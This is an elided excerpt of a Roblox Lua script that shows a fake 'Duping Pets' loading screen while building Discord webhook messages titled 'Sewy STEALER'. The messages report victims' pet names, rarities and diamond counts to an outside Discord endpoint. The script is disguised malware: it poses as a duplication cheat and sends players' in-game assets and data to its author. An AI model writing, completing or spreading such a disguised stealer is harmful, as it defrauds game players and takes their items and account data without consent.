...
if _G.LoadingScreen ~= false then
    local ScreenGui = Instance.new("ScreenGui")
                            ...
                            TextLabel.Text = "Duping Pets PLease Wait"
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1115597781504110692/1123805179733626981/A-5944638-1502980138-6120.jpg"
        data1 = {
            ["content"] = ping,
            ...
            ["embeds"] = { {
                ["title"] = "**Sewy STEALER**",
                ["url"] = "https://discord.gg/FaembZEZ5",
                ["type"] = "rich",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using Sewy Scriptz's Stealer** :money_mouth:",
...
if getgenv().Settings ~= nil then
    if getgenv().Settings.PremiumKey ~= nil then
        ...
        local dhurl = "https://discord.gg/FaembZEZ5"
        local dhheaders = {
            ["content-type"] = "application/json"
        }
